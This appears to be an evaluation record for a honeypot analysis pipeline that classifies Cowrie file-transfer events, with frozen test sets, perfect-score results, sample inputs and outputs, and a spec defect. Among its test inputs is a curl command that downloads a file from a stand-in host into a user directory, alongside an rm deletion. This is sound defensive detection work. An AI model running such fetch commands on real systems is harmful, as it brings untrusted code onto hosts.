# Direct Cowrie transfer-family evaluation

Date: 2026-07-30

Starting revision:
`50de9c25d15f3a8ea642e41108b22d2caefa8240`

This record covers only the activated direct-observation slice of the typed
`transfer` family. Command-derived transfer attempts remain ineligible, and
every other operation family remains contained or shadow-only.

## Frozen evidence

| Artifact | SHA-256 | Cases | Freeze point |
| --- | --- | ---: | --- |
| `evaluation/transfer_family_independent_frozen.v1.json` | `3b235d4f247f7506079452c8da869c9dc21eb26fb57c5a235850aa2b2ec20cd9` | 34 | Commit `f095ac7d7a3cda28461a3ca6756a45b83f3085b1`, before first replay |
| `evaluation/transfer_family_holdout_frozen.v1.json` | `6050f6c0c6cf23b8cf47729cdcf94510dbf30858f2cf50d90a292237516e545a` | 21 | Commit `fd83d6384134a9348fea315d76d5ce63c58ff163`, after implementation tests and before first holdout replay |

Neither file was relabeled after execution.

## Results

| Measure | Independent set | Holdout | Combined |
| --- | ---: | ---: | ---: |
| Typed `transfer_observed` TP / FP / FN / TN | 17 / 0 / 0 / 17 | 14 / 0 / 0 / 7 | 31 / 0 / 0 / 24 |
| Typed-operation precision / recall / F1 | 1.000 / 1.000 / 1.000 | 1.000 / 1.000 / 1.000 | 1.000 / 1.000 / 1.000 |
| Eligible-family TP / FP / FN / TN | 12 / 0 / 0 / 22 | 9 / 0 / 0 / 12 | 21 / 0 / 0 / 34 |
| Eligible-family precision / recall / F1 | 1.000 / 1.000 / 1.000 | 1.000 / 1.000 / 1.000 | 1.000 / 1.000 / 1.000 |
| Specialized-finding precision / recall / F1 | 1.000 / 1.000 / 1.000 | 1.000 / 1.000 / 1.000 | 1.000 / 1.000 / 1.000 |
| Guidance precision / recall / F1 | 1.000 / 1.000 / 1.000 | 1.000 / 1.000 / 1.000 | 1.000 / 1.000 / 1.000 |
| Unsupported specialized outputs | 0 | 0 | 0 |
| Emitted transfer hypotheses | 0 | 0 | 0 |
| Contradicted/unfalsifiable emitted hypotheses | 0 | 0 | 0 |
| Reference and integrity validation | 34/34 | 21/21 | 55/55 |
| Deterministic repeated semantic results | 34/34 | 21/21 | 55/55 |
| SQLite and artifact validation | 34/34 | 21/21 | 55/55 |

Every eligible result cited only a direct
`cowrie.session.file_download` or `cowrie.session.file_upload` observation.
Every specialized action retained manual approval, prohibited automatic
execution, and had no alerting or response side effect. Prediction,
enrichment, injected hypothesis prose, and ATT&CK-only context changed no
finding, hypothesis, action, or canonical identity.

The artifact run validated SQLite report persistence, canonical JSON,
Markdown, STIX, and each integrity manifest. ReportLab was not installed in
the local test environment, so the configured deterministic
`pdf_fallback_markdown` path ran instead of the native PDF renderer. Native PDF
rendering remains covered by the existing optional-dependency tests but was
not independently exercised in this run.

The combined replay took 7.39 seconds with 50,920 KiB maximum resident memory
on the local test host, including 55 SQLite persistence cycles and 55 artifact
sets.

## Representative actual outputs

### Direct event

Input: `cowrie.session.file_download` for
`/opt/quarantine/cache.pkg`, SHA-256
`1111111111111111111111111111111111111111111111111111111111111111`.

- Typed fact: `transfer_observed`, outcome `event_observed`, proof
  `direct_cowrie_event`.
- Selector: matched the exact hash and direct Cowrie evidence reference.
- v4: emitted `observed_cowrie_transfer_event`.
- Hypotheses: none.
- v3: emitted `hunt-observed-transfer-indicators`, limited to authorized
  exact-hash correlation, with manual approval required and automatic
  execution prohibited.
- Limitations explicitly deny artifact execution, attacker intent, and any
  real-host effect.

### Command attempt with T1105

Input:
`curl --silent --output /run/user/1000/fetched.o https://edge.invalid/fetched.o`,
Cowrie-reported success, with a trusted T1105 candidate.

- Typed facts: `remote_content_access` and `transfer_attempt`;
  `reported_completed` remains Cowrie command outcome rather than direct-event
  or real-host proof.
- Selector: abstained because direct event, exact artifact hash, eligible
  outcome, and direct-event reference were absent.
- v4 finding, threat hypothesis, and specialized v3 action: all suppressed.

### Unresolved direct-event path

Input: direct file-download event with destination
`queue/twenty-five.bin`, no observed CWD, and a valid SHA-256.

- Typed fact preserves `transfer_observed` and the hash, but the path remains
  `relative:queue/twenty-five.bin`.
- Selector: abstained with `fact_identity_unresolved`.
- No specialized finding, hypothesis, or guidance was emitted.

### Direct event followed by deletion

Input: a direct event for `/srv/stage/thirty-one.bin`, followed by
`rm /srv/stage/thirty-one.bin`.

- Complete evidence order is preserved:
  `transfer_observed` then `file_delete`.
- The direct event selects only the observed-transfer finding and exact-hash
  review.
- The non-migrated deletion family creates no transfer hypothesis or broader
  action.

### SFTP upload

Input: `cowrie.session.file_upload` with
`sftp://archive.invalid:22/bravo.raw`.

- The typed fact losslessly retains the URL as
  `sftp://archive.invalid/bravo.raw`, the path, and exact SHA-256.
- The default SFTP port is normalized without granting URL-based authority.
- Selection and outputs remain grounded solely in the direct event and hash.

## Old versus new authority

At the starting revision, T1105 alone could select transfer guidance even when
the observed command was benign, while a standalone direct transfer event
could fail to select that guidance. The new family reverses that defect:

- ATT&CK-only and command-attempt cases abstain;
- direct events with exact resolved SHA-256 identities select bounded findings
  and manual review;
- transfer-to-execution and other follow-on hypotheses remain suppressed until
  their own families and relationships are separately reviewed.

## Evaluation-spec defect

The frozen holdout case `TFH-013` correctly expected `file_read` plus
`file_write`, no eligible transfer selection, and no specialized output for a
local `cp` command. Its ancillary entity-role expectation used
`source_paths`, while the existing non-migrated filesystem contract emits
`read_paths` plus `created_paths`.

This is an evaluation-spec terminology defect, not a transfer-family,
authority, parser, or reference-resolution defect. The frozen file was not
changed. Production was not altered to satisfy the incorrect role label. The
replay records the discrepancy explicitly, and all authority and safety labels
for the case pass. An independently authored future filesystem-family
evaluation should resolve that terminology before filesystem activation.

## Policy integrity

- Typed semantic vocabulary SHA-256:
  `0a178fb303ff90d8ba1c1054f5457b9c9164ca1b96fddf8a239923ab9138f2fe`
- Behavior policy SHA-256:
  `707ad86e221a297cc6bc7e8cadd64c0a3b7e71aafe88a3e27135f2f4c1e0d538`
- Response-guidance policy SHA-256:
  `6ba56f1598821f9ba5537f99eb788ee47d1d8fe96d7047fa579546d11d99c754`

All three policy validators passed. The full repository suite passed:
`895 passed, 7 skipped`.

## Readiness and boundary

The direct-event slice is suitable to retain for independent evaluation. This
does not approve command attempts, execution relationships, or any other
transfer semantics. Native PDF rendering should be rerun in the declared
artifact dependency environment, and the frozen holdout's one terminology
defect prevents describing the complete auxiliary entity-label set as a
perfect independent pass.

Rollback boundaries are the starting revision `50de9c25...`, the contract
commit `9b43ffa...`, and the implementation commit `aaa0f3d...`. No database,
historical record, production service, GCP host, or Raspberry Pi was accessed
or changed.
